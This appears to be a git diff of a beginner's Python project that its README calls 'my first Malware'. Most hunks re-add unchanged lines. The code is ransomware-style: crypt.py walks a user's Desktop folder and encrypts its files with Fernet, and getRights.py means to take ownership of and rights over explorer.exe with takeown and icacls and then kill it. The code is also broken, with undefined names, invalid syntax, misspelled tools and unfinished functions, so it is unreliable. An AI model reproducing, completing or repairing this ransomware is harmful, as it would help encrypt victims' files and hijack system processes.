'diff --git a/README.md b/README.md\nindex 24c2618..9f0253e 100644\n--- a/README.md\n+++ b/README.md\n@@ -1,2 +1,2 @@\n-# 1stMalware\n-Here is my first Malware made with Python 3.7.9\n+# 1stMalware\n+Here is my first Malware made with Python 3.7.9\ndiff --git a/__init__.py b/__init__.py\nindex 882e540..3a072ba 100644\n--- a/__init__.py\n+++ b/__init__.py\n@@ -1 +1 @@\n-pass \n+pass \ndiff --git a/main.py b/main.py\nindex 87cfee1..8eeb931 100644\n--- a/main.py\n+++ b/main.py\n@@ -1,6 +1,14 @@\n-#!/usr/bin/python\n-#coding:utf-8\n-\n-from modules.crypt import crypt\n-\n-import os\n+#!/usr/bin/python\n+#coding:utf-8\n+\n+from modules.crypt import crypt\n+import os, sys\n+\n+# ENVIRONMENT VARIABLE\n+current_user = os.environ["USERNAME"]\n+\n+# DEFINE VARIABLES FOR THE FUNCTIONS NEEDED\n+test = fixing bugs\n+\n+# CONDITION TO CHECK IF THE USER IS ADMIN\n+if(get_admin_rights.is_admin()):\ndiff --git a/modules/__init__.py b/modules/__init__.py\nindex 882e540..3a072ba 100644\n--- a/modules/__init__.py\n+++ b/modules/__init__.py\n@@ -1 +1 @@\n-pass \n+pass \ndiff --git a/modules/crypt/__init__.py b/modules/crypt/__init__.py\nindex 882e540..3a072ba 100644\n--- a/modules/crypt/__init__.py\n+++ b/modules/crypt/__init__.py\n@@ -1 +1 @@\n-pass \n+pass \ndiff --git a/modules/crypt/crypt.py b/modules/crypt/crypt.py\nindex 75527fd..4be8713 100644\n--- a/modules/crypt/crypt.py\n+++ b/modules/crypt/crypt.py\n@@ -1,49 +1,49 @@\n-#!/usr/bin/python\n-#coding:utf-8\n-import os\n-from cryptography.fernet import Fernet\n-\n-class exploreThenCrypt():\n-\n-    def __init__(self):\n-        self.key = Fernet.generate_key()\n-        self.name_key = os.environ["USERNAME"]\n-\n-    #Key generator\n-    def keyCreation(self, keyname):\n-        key = Fernet.generate_key()\n-        #Write it down somewhere on a file\n-        with open(f"{keyname}".key, \'wb\') as filekey:\n-            filekey.write(self.key)\n-\n-    #Storing and reading the key\n-    def useTheKey(self,key,name):\n-        with open(name, \'rb\') as file:\n-            crypting = file.read()\n-\n-        #Using the key to crypt\n-        fernet = Fernet(self.key)\n-        encrypted = fernet.encrypt(crypting)\n-        try:\n-            with open(encrypted, \'wb\') as files:\n-                files.write(encrypted)\n-        except:\n-            pass\n-\n-    #Explore then crypt everything from root\n-    def exploreAll(self):\n-        #Define the target in a var which is a letter :/Users/....\n-        letter = os.environ["SystemDrive"]\n-        target = "\\\\Users\\\\Wilder\\\\Desktop\\\\dirb"\n-\n-        #Crypting all folders and files from the target\n-        for files in target:\n-            for root, dirs, files in os.walk(files):\n-                for file in files:\n-                    try:\n-                        dir = os.path.join(root, file)\n-                        crypting(self.key, dir)\n-                    except:\n-                        print("ERROR, NOTHING HAS BEEN ENCRYPTED")\n-\n-exploreThenCrypt()\n+#!/usr/bin/python\n+#coding:utf-8\n+import os\n+from cryptography.fernet import Fernet\n+\n+class exploreThenCrypt():\n+\n+    def __init__(self):\n+        self.key = Fernet.generate_key()\n+        self.name_key = os.environ["USERNAME"]\n+\n+    #Key generator\n+    def keyCreation(self, keyname):\n+        key = Fernet.generate_key()\n+        #Write it down somewhere on a file\n+        with open(f"{keyname}".key, \'wb\') as filekey:\n+            filekey.write(self.key)\n+\n+    #Storing and reading the key\n+    def useTheKey(self,key,name):\n+        with open(name, \'rb\') as file:\n+            crypting = file.read()\n+\n+        #Using the key to crypt\n+        fernet = Fernet(self.key)\n+        encrypted = fernet.encrypt(crypting)\n+        try:\n+            with open(encrypted, \'wb\') as files:\n+                files.write(encrypted)\n+        except:\n+            pass\n+\n+    #Explore then crypt everything from root\n+    def exploreAll(self):\n+        #Define the target in a var which is a letter :/Users/....\n+        letter = os.environ["SystemDrive"]\n+        target = "\\\\Users\\\\Wilder\\\\Desktop\\\\dirb"\n+\n+        #Crypting all folders and files from the target\n+        for files in target:\n+            for root, dirs, files in os.walk(files):\n+                for file in files:\n+                    try:\n+                        dir = os.path.join(root, file)\n+                        crypting(self.key, dir)\n+                    except:\n+                        print("ERROR, NOTHING HAS BEEN ENCRYPTED")\n+\n+exploreThenCrypt()\ndiff --git a/modules/rights/getRights.py b/modules/rights/getRights.py\nindex 7a30304..9e8e75a 100644\n--- a/modules/rights/getRights.py\n+++ b/modules/rights/getRights.py\n@@ -1,28 +1,28 @@\n-#!/usr/bin/python\n-#coding:utf-8\n-\n-import os, sys\n-\n-class ownThenUse():\n-    #First things first, get all the rights needed to start crypting *\n-    letter = os.environ[\'SystemDrive\']\n-\n-    def processus(self):\n-        #Find the process I want to own\n-        self.explorer = "explorer.exe"\n-        self.path_to_takeown = "{}\\\\Windows\\\\System32\\\\takeown.exe".format(lettre)\n-\n-    def takeTheOwn(self):\n-        #Own it\n-        self.get_ownership = "{}{}".format(self.path_to_takeown,self.explorer)\n-        os.system(self.get_ownership)\n-        self.path_to_icalcs = "{}\\\\Windows\\\\System32\\\\icalcs.exe".format(lettre)\n-\n-    def getTheRights(self):\n-        #Get all the rights\n-        self.path_to_icalcs = "{}\\\\Windows\\\\System32\\\\icalcs.exe".format(lettre)\n-        self.get_permissions = "{}{}".format(self.path_to_icalcs,self.explorer)\n-\n-    def killTheProcess(self):\n-        #Delete the process choose\n-        \n+#!/usr/bin/python\n+#coding:utf-8\n+\n+import os, sys\n+\n+class ownThenUse():\n+    #First things first, get all the rights needed to start crypting *\n+    letter = os.environ[\'SystemDrive\']\n+\n+    def processus(self):\n+        #Find the process I want to own\n+        self.explorer = "explorer.exe"\n+        self.path_to_takeown = "{}\\\\Windows\\\\System32\\\\takeown.exe".format(lettre)\n+\n+    def takeTheOwn(self):\n+        #Own it\n+        self.get_ownership = "{}{}".format(self.path_to_takeown,self.explorer)\n+        os.system(self.get_ownership)\n+        self.path_to_icalcs = "{}\\\\Windows\\\\System32\\\\icalcs.exe".format(lettre)\n+\n+    def getTheRights(self):\n+        #Get all the rights\n+        self.path_to_icalcs = "{}\\\\Windows\\\\System32\\\\icalcs.exe".format(lettre)\n+        self.get_permissions = "{}{}".format(self.path_to_icalcs,self.explorer)\n+\n+    def killTheProcess(self):\n+        #Delete the process choose\n+        \n'